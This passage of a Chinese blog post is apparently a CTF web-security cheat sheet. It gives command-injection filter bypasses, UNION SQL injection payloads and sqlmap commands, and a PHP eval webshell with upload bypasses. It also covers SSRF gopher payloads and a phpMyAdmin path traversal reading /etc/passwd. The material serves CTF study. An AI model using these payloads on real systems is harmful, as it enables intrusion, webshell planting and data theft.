+<p><code>ping 127.0.0.1 &amp;&amp; ls</code>：<code>&amp;&amp;</code> 符号表示只有在前一个命令成功执行（返回值为0）时，才会执行下一个命令。在这个例子中，<code>ls</code> 命令只有在 <code>ping 127.0.0.1</code> 命令成功执行后才会执行。然而，<code>ping</code> 命令在默认情况下会持续执行，你需要手动停止它（例如，按 <code>Ctrl+C</code>）才能让 <code>ls</code> 命令执行。</p>
+</li>
+<li>
+<p><code>ping 127.0.0.1 | ls</code>：<code>|</code> 符号是管道符，表示将前一个命令的输出作为后一个命令的输入。然而，在这个例子中，这种用法是不正确的，因为 <code>ls</code> 命令本身不接受来自其他命令的输入。因此，这个命令可能会导致错误或不可预期的行为。</p>
+</li>
+<li>
+<p><code>ping 127.0.0.1 ; ls</code>： <code>;</code> 符号表示在同一行上执行多个命令。命令会按顺序执行，不考虑前一个命令的执行结果。在这个例子中，<code>ping 127.0.0.1</code> 命令会首先执行，然后在其完成后（需要手动停止，例如按 Ctrl+C），<code>ls</code> 命令会立即执行。</p>
+</li>
+</ul>
+<p>过滤小结:</p>
+<ul>
+<li>过滤cat:</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ca/t ca<span class="string">&quot;&quot;</span>t ca<span class="string">&#x27;&#x27;</span>t</span><br><span class="line">拼接 a=ca;b=t;$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>过滤空格: <code>&lt;,&lt;&gt;,$&#123;IFS&#125;</code></li>
+<li>过滤运算分隔符号:<code>;-&gt;%0a</code> <code>file | base64-&gt; base64 file</code> <code>/-&gt;cd$&#123;IFS&#125;</code></li>
+</ul>
+<h2 id="sql注入">sql注入</h2>
+<p>正道在此：！</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.查当前数据库名称</span><br><span class="line"></span><br><span class="line"> <span class="string">&#x27; or 1=1 union select 1,database(),3 limit 1,2;#-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">得到数据库名称web2</span></span><br><span class="line"><span class="string">2.查看数据库表的数量</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> or 1=1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> count(*) from information_schema.tables <span class="built_in">where</span> table_schema = <span class="string">&#x27;web2&#x27;</span>),3 <span class="built_in">limit</span> 1,2;<span class="comment">#-- </span></span><br><span class="line"></span><br><span class="line">得到数据库表数量为2</span><br><span class="line">3.查表的名字</span><br><span class="line"></span><br><span class="line">第一个表:</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or 1=1 union select 1,(select table_name from information_schema.tables where table_schema = &#x27;</span>web2<span class="string">&#x27; limit 0,1),3 limit 1,2;#-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">得到表名：flag 第二个表:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> or 1=1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> table_name from information_schema.tables <span class="built_in">where</span> table_schema = <span class="string">&#x27;web2&#x27;</span> <span class="built_in">limit</span> 1,2),3 <span class="built_in">limit</span> 1,2;<span class="comment">#-- </span></span><br><span class="line"></span><br><span class="line">得到表名：user</span><br><span class="line">4.查flag表列的数量</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or 1=1 union select 1,(select count(*) from information_schema.columns where table_name = &#x27;</span>flag<span class="string">&#x27; limit 0,1),3 limit 1,2;#-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">只有1列</span></span><br><span class="line"><span class="string">5.查flag表列的名字</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> or 1=1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> column_name from information_schema.columns <span class="built_in">where</span> table_name = <span class="string">&#x27;flag&#x27;</span> <span class="built_in">limit</span> 0,1),3 <span class="built_in">limit</span> 1,2;<span class="comment">#-- </span></span><br><span class="line"></span><br><span class="line">列名为flag</span><br><span class="line">6.查flag表记录的数量</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27; or 1=1 union select 1,(select count(*) from flag),3 limit 1,2;#-- </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">只有一条记录</span></span><br><span class="line"><span class="string">7.查flag表记录值</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> or 1=1 union <span class="keyword">select</span> 1,(<span class="keyword">select</span> flag from flag <span class="built_in">limit</span> 0,1),3 <span class="built_in">limit</span> 1,2;<span class="comment">#-- </span></span><br><span class="line"></span><br><span class="line">得到flag</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#POST 需要 --data &#x27;a=1&amp;b=2&#x27; --dbs</span></span><br><span class="line">1.sqlmap -u <span class="string">&quot;目标网址/?id=1&quot;</span> --dbs</span><br><span class="line">2.sqlmap -u <span class="string">&quot;目标网址&quot;</span> -D [数据库名] --tables</span><br><span class="line">3.sqlmap -u <span class="string">&quot;目标网址&quot;</span> -D [数据库名] -T [表名] --columns</span><br><span class="line">4.sqlmap -u <span class="string">&quot;目标网址&quot;</span> -D [数据库名] -T [表名] -C [列名] --dump</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">报错注入: sqlmap -u [目标url] --current-db --batch --threads 10 --technique E </span><br><span class="line">布尔盲注: sqlmap -u [目标url] --current-db --batch --threads 10 --technique B</span><br><span class="line">时间盲注: sqlmap -u [目标url] --current-db --batch --threads 10 --technique T -v 3</span><br><span class="line"></span><br><span class="line">！POST注入（*标识哪里 就对哪里进行打击）</span><br><span class="line">sqlmap -u <span class="string">&quot;目标url&quot;</span> --data <span class="string">&quot;uname=admin*&amp;passwd=admin&amp;submit=Submit&quot;</span> --dbs --batch --threads 10 --technique E</span><br><span class="line"></span><br><span class="line">SQLmap实现Http-header头注入之 </span><br><span class="line">1.User-Agent注入 ：</span><br><span class="line"><span class="comment">#在使用请求头注入的时候，--level必须大于3</span></span><br><span class="line"></span><br><span class="line">sqlmap -u [目标url] --user-agent=<span class="string">&quot;抓包得到的对应的内容*&quot;</span> --level 4 --dbs --threads 10 --batch --technique E</span><br><span class="line"></span><br><span class="line">2.Cookie注入 ：</span><br><span class="line">// sqlmap -u [目标url] --cookie=<span class="string">&quot;原来*的cookie内容&quot;</span> --level 4 --dbs --threads 10 --batch --technique E</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#一些补充</span></span><br><span class="line">--technique B 布尔盲注 </span><br><span class="line">--technique E 报错注入</span><br><span class="line">--technique U union查询注入</span><br><span class="line">--technique S 堆叠注入</span><br><span class="line">--technique T 时间盲注</span><br><span class="line">--technique Q 内联查询注入</span><br><span class="line"></span><br><span class="line">脚本绕过限制 </span><br><span class="line">eg：sqlmap -u <span class="string">&quot;目标网址&quot;</span> -D [数据库名] -T [表名] -C [列名] --dump --tamper space2comment.py</span><br><span class="line"></span><br><span class="line">space2comment.py    -- 作用是用注释/**/替换空格字符<span class="string">&#x27; &#x27;</span></span><br><span class="line">equaltolike.py      -- 作用是用like代替等号</span><br><span class="line">apostrophemask.py   -- 作用是用utf8代替引号</span><br><span class="line">greatest.py         -- 作用是绕过过滤<span class="string">&#x27;&gt;&#x27;</span> ,用GREATEST替换大于号</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>为什么<code>username=xxx'or'1=1&amp;password=xxx'or'1=1</code>可以达到SQL注入，从而直接输出表内容的目的。</p>
+<p>假设我们的表名叫<code>t_user</code>，<code>username</code>为用户名字段，<code>password</code>为密码字段，只有当用户名和密码字段都正确的时候才能输出该数据的内容</p>
+<p><code>SELECT * FROM t_user WHERE username = 'xxx' AND password = &quot;xxxx&quot;</code><br>
+但是我们通过在xxx后面拼接一个’号来闭合<code>username</code>的值，然后通过<code>or 1 = 1</code>使where的条件恒等于true，上面的SQL也就变成了</p>
+<p><code>SELECT * FROM t_user WHERE username='xxx'or 1 = 1 AND password='xxx'or 1 = 1</code><br>
+从而可以查出所有的数据。</p>
+<h2 id="文件上传">文件上传</h2>
+<blockquote>
+<p>工具：蚁剑</p>
+</blockquote>
+<ul>
+<li>一句话木马 <code>&lt;?php eval(@$_POST['a']); ?&gt;</code></li>
+</ul>
+<p>上传文件绕过限制：</p>
+<blockquote>
+<ul>
+<li>前端验证: 关闭前端js 或许改后缀名bp重发</li>
+<li>.htaccess: 传入.htaccess文件内容为<code>AddType application/x-httpd-php x</code>or<code>SetHandler application/x-httpd-php</code><br>
+#x为格式 如.jpg .png 作用是用php格式打开这些文件，然后把一句话木马以对应后缀上传即可。(后者为把所有文件当成php处理)</li>
+<li>00截断:用户输入的url参数包含%00经过浏览器自动转码后截断后面字符.<br>
+#需要注意的是 将<code>POST /?road=/var/www/html/upload/ HTTP/1.1</code>改为<code>POST /?road=/var/www/html/upload/shell.php%00 HTTP/1.1</code>。而不是更改 <code>filename=&quot;shell.png&quot;</code>为<code>filename=&quot;shell.php%00png</code></li>
+<li>文件头检测:对于某些限制png jpg等格式上传的，会对其文件头进行检测。如png 只需在一句话木马二进制文件前加上<code>89504E47</code> 再用bp重发，蚁剑连接。</li>
+<li>双写后缀:可能在出现<code>php php5 ajax</code>等后缀置为空白，构造<code>pphphp</code>后缀，则会置为php后缀</li>
+<li>MIME绕过:如下所示</li>
+</ul>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.先对于服务器上传不同的文件，直至上传成功，然后利用BS进行抓包。查看报文的最后一段有Content-<span class="built_in">type</span>字段部分</span><br><span class="line">2.上传木马，修改Content-<span class="built_in">type</span></span><br><span class="line">3.使用antSword进行连接</span><br></pre></td></tr></table></figure>
+<p>蚁剑，一句话木马，bp重发请求文件上传，配置文件绕过限制<br>
+数据库漏洞</p>
+<h2 id="SSRF">SSRF</h2>
+<h3 id="伪协议">伪协议</h3>
+<blockquote>
+<p>已单独开了一篇文章 指路 <a href="https://">here</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">file:///</span><br><span class="line"><span class="comment">#file:///var/www/html/flag.php</span></span><br><span class="line">dict://</span><br><span class="line"><span class="comment">#探测内网端口协议</span></span><br><span class="line">sftp://</span><br><span class="line">ldap://</span><br><span class="line">tftp://</span><br><span class="line">gopher://(万金油)</span><br></pre></td></tr></table></figure>
+<h3 id="端口扫描">端口扫描</h3>
+<p>bp 攻击<br>
+<code>url=dict://127.0.0.1:8000</code><br>
+<code>$8000$负载number8000-9000 step:1</code></p>
+<p>扫描找到数据字节不同的端口重发<br>
+<code>http://127.0.0.1:xxxx</code></p>
+<h3 id="POST请求">POST请求</h3>
+<h4 id="gopher协议">gopher协议</h4>
+<p>最终gopher协议伪造的http请求<br>
+<code>POST%252520%25252Fflag.php%252520HTTP%25252F1.1%25250D%25250Ahost%25253A%252520127.0.0.1%25253A80%25250D%25250AContent-Type%25253A%252520application%25252Fx-www-form-urlencoded%25250D%25250AContent-Length%25253A%25252036%25250D%25250A%25250D%25250Akey%25253D5b69b89c146e1ed3b90708ffa267f06a</code><br>
+三次URL解码得到的玩意:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">POST /flag.php HTTP/1.1</span><br><span class="line">host: 127.0.0.1:80</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 36</span><br><span class="line">key=5b69b89c146e1ed3b90708ffa267f06a</span><br></pre></td></tr></table></figure>
+<p>(但是我真的没看懂，日后再说)<br>
+大佬牛b！！！</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload =\</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">yourpayload</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>  <span class="comment"># 注意后面一定要有回车，回车结尾表示http请求结束</span></span><br><span class="line"></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>, <span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">new = urllib.parse.quote(new)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span> + <span class="string">&#x27;_&#x27;</span> + new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
+<p><code>GET /?url=http://127.0.0.1:80/index.php?url=result   HTTP/1.1</code>重发即可</p>
+<h2 id="一些漏洞">一些漏洞</h2>
+<p>对于某些漏洞，查询版本即可<br>
+如phpmyadmin 4.80/4.81</p>
+<ul>
+<li><code>?target=db_datadict.php%253f../../../../../../etc/passwd</code></li>
+<li><code>?target=db_datadict.php%253f../../../../../../flag</code><br>
+即可获取flag</li>
+</ul>
+<p>qs:<br>
+qs是负责url参数转换js库。</p>
+<p>简单用法：foo[bar]=baz–&gt;</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">assert.deepEqual(qs.parse(<span class="string">&#x27;foo[bar]=baz&#x27;</span>),&#123;</span><br><span class="line">    foo:&#123;</span><br><span class="line">      bar:<span class="string">&#x27;baz&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">#可嵌套对象</span></span><br><span class="line"><span class="comment">#   foo:&#123;</span></span><br><span class="line"><span class="comment">#     bar:&#123;</span></span><br><span class="line"><span class="comment">#         baz：&#x27;foobarbaz&#x27;</span></span><br><span class="line"><span class="comment">#     &#125;</span></span><br><span class="line"><span class="comment">#   &#125;</span></span><br></pre></td></tr></table></figure>
+<p>url:a=b&amp;proxy=nginx–&gt;<br>
+<code>&#123;a:'b',proxy:'nginx'&#125;</code><br>
+qs最多解析1000个参数<br>
+所以<br>
+answer: <code>url/?a=1&amp;a=1.............</code></p>
+<h2 id="END">END</h2>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/img/14.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/04/21/python/" title="python"><img class="cover" src="/img/14.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">python</div></div></a></div><div class="next-post pull-right"><a href="/2023/04/19/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E4%B8%80/" title="动态规划(一)"><img class="cover" src="/img/14.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">动态规划(一)</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/05/16/MISC/" title="MISC"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-16</div><div class="title">MISC</div></div></a></div><div><a href="/2023/05/22/NEEPU/" title="NEEPU"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-22</div><div class="title">NEEPU</div></div></a></div><div><a href="/2023/05/20/XXE/" title="XXE"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-20</div><div class="title">XXE</div></div></a></div><div><a href="/2023/05/30/interesting/" title="interesting"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-30</div><div class="title">interesting</div></div></a></div><div><a href="/2023/07/26/interesting3/" title="interesting3"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-26</div><div class="title">interesting3</div></div></a></div><div><a href="/2023/04/16/XSS/" title="XSS"><img class="cover" src="/img/14.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-16</div><div class="title">XSS</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/18.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">dionysus</div><div class="author-info__description">我醉欲眠卿且去</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">21</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">6</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/MoonlitSyntax"><i class="fab fa-github"></i><span>此心安处</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="/img/wechat.png" target="_blank" title="微信"><i class="iconfont  icon-weixin"></i></a><a class="social-icon" href="https://res.abeim.cn/api/qq/?qq=1475856026" target="_blank" title="QQ"><i class="iconfont icon-QQ"></i></a><a class="social-icon" href="https://space.bilibili.com/430091327?spm_id_from=333.1007.0.0" target="_blank" title="bilibili"><i class="iconfont icon-bilibili"></i></a><a class="social-icon" href="mailto:1475856026@qq.com" target="_blank" title="QQ邮箱"><i class="iconfont icon-youxiang"></i></a><a class="social-icon" href="https://chat.openai.com" target="_blank" title="chatgpt"><i class="iconfont icon-ai"></i></a><a class="social-icon" href="https://www.luogu.com.cn" target="_blank" title="洛谷"><i class="iconfont icon-code"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><a class="faa-parent animated-hover"><svg class="faa-tada icon" style="height:25px;width:25px;fill:currentColor;position:relative;top:5px" aria-hidden="true"><use xlink:href="#icon-pinglun-1"></use></svg></a><span>今日诗词</span></div><div class="announcement_content"><script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8"></script> <div id="poem_sentence"></div> <div id="poem_info"></div> <script type="text/javascript">
+  jinrishici.load(function(result) {
+    var sentence = document.querySelector("#poem_sentence")
+    var info = document.querySelector("#poem_info")
+
+    var content = result.data.origin.content;
+
+    // 分割诗句为数组
+    var splitContent = [];
+    content.forEach(line => {
+        var phrases = line.split(/([。，])/);
+        for (var i = 0; i < phrases.length; i += 2) {
+            var phrase = phrases[i];
+            if (i + 1 < phrases.length) {
+                phrase += phrases[i + 1];
+            }
+            splitContent.push(phrase);
+        }
+    });
+
+    // 构建新的诗句
+    var newContent = "";
+    var line = "";
+    for (var i = 0; i < splitContent.length; i++) {
+        if (line.length + splitContent[i].length <= 15) {
+            line += splitContent[i];
+        } else {
+            newContent += line + '<br>';
+            line = splitContent[i];
+        }
+    }
+    newContent += line;
+
+    sentence.innerHTML = newContent;
+    info.innerHTML = '【' + result.data.origin.dynasty + '】' + result.data.origin.author + '《' + result.data.origin.title + '》';
+  });
+</script>
+</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E7%9A%84dos%E5%91%BD%E4%BB%A4"><span class="toc-number">1.</span> <span class="toc-text">基本的dos命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2"><span class="toc-number">2.</span> <span class="toc-text">信息泄露</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#http%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.1.</span> <span class="toc-text">http协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vim-%E4%BA%A4%E6%8D%A2%E6%96%87%E4%BB%B6%E5%90%8D"><span class="toc-number">2.2.</span> <span class="toc-text">vim 交换文件名</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%9B%AE%E5%BD%95"><span class="toc-number">2.3.</span> <span class="toc-text">扫描目录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DS-Store%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2"><span class="toc-number">2.4.</span> <span class="toc-text">.DS_Store文件泄露</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Git%E6%B3%84%E6%BC%8F"><span class="toc-number">2.5.</span> <span class="toc-text">Git泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSTI"><span class="toc-number">2.6.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#smarty"><span class="toc-number">2.6.1.</span> <span class="toc-text">smarty</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#svn%E6%B3%84%E6%BC%8F"><span class="toc-number">2.7.</span> <span class="toc-text">svn泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hg%E6%B3%84%E6%BC%8F"><span class="toc-number">2.8.</span> <span class="toc-text">hg泄漏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E8%AF%A2%E5%85%B7%E4%BD%93%E6%89%80%E5%90%AB%E6%95%B0%E6%8D%AE"><span class="toc-number">2.9.</span> <span class="toc-text">查询具体所含数据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">3.</span> <span class="toc-text">密码爆破</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE"><span class="toc-number">4.</span> <span class="toc-text">RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#exec"><span class="toc-number">4.1.</span> <span class="toc-text">exec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eval%E6%89%A7%E8%A1%8C"><span class="toc-number">4.2.</span> <span class="toc-text">eval执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">4.3.</span> <span class="toc-text">文件包含</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">5.</span> <span class="toc-text">sql注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-number">6.</span> <span class="toc-text">文件上传</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">7.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.1.</span> <span class="toc-text">伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">7.2.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POST%E8%AF%B7%E6%B1%82"><span class="toc-number">7.3.</span> <span class="toc-text">POST请求</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#gopher%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.3.1.</span> <span class="toc-text">gopher协议</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E4%BA%9B%E6%BC%8F%E6%B4%9E"><span class="toc-number">8.</span> <span class="toc-text">一些漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#END"><span class="toc-number">9.</span> <span class="toc-text">END</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/07/26/interesting3/" title="interesting3"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="interesting3"/></a><div class="content"><a class="title" href="/2023/07/26/interesting3/" title="interesting3">interesting3</a><time datetime="2023-07-26T15:13:35.000Z" title="发表于 2023-07-26 23:13:35">2023-07-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/07/26/interesting2/" title="interesting2"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="interesting2"/></a><div class="content"><a class="title" href="/2023/07/26/interesting2/" title="interesting2">interesting2</a><time datetime="2023-07-26T10:08:18.000Z" title="发表于 2023-07-26 18:08:18">2023-07-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/31/moonlit/" title="moonlit"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="moonlit"/></a><div class="content"><a class="title" href="/2023/05/31/moonlit/" title="moonlit">moonlit</a><time datetime="2023-05-30T16:31:57.000Z" title="发表于 2023-05-31 00:31:57">2023-05-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/30/interesting/" title="interesting"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="interesting"/></a><div class="content"><a class="title" href="/2023/05/30/interesting/" title="interesting">interesting</a><time datetime="2023-05-30T12:19:08.000Z" title="发表于 2023-05-30 20:19:08">2023-05-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/05/22/session%E4%BC%AA%E9%80%A0/" title="session伪造"><img src="/img/14.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="session伪造"/></a><div class="content"><a class="title" href="/2023/05/22/session%E4%BC%AA%E9%80%A0/" title="session伪造">session伪造</a><time datetime="2023-05-22T11:31:22.000Z" title="发表于 2023-05-22 19:31:22">2023-05-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 By dionysus</div><div class="footer_custom_text">此心安处是吾乡</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (true){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><div class="js-pjax"></div><script defer src="/js/cursor.js"></script><canvas id="snow"></canvas><script async src="/js/snow.js"></script><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><script async data-pjax src="/js/randombg.js"></script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div id="algolia-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="search-wrap"><div id="algolia-search-input"></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-info"><div class="algolia-stats"></div><div class="algolia-poweredBy"></div></div></div></div></div><div id="search-mask"></div><script src="https://cdn.jsdelivr.net/npm/algoliasearch/dist/algoliasearch-lite.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instantsearch.js/dist/instantsearch.production.min.js"></script><script src="/js/search/algolia.js"></script></div></div><!-- hexo injector body_end start --><script async src="//at.alicdn.com/t/c/font_4186045_vjy9vudusnm.js"></script><!-- hexo injector body_end end --></body></html>
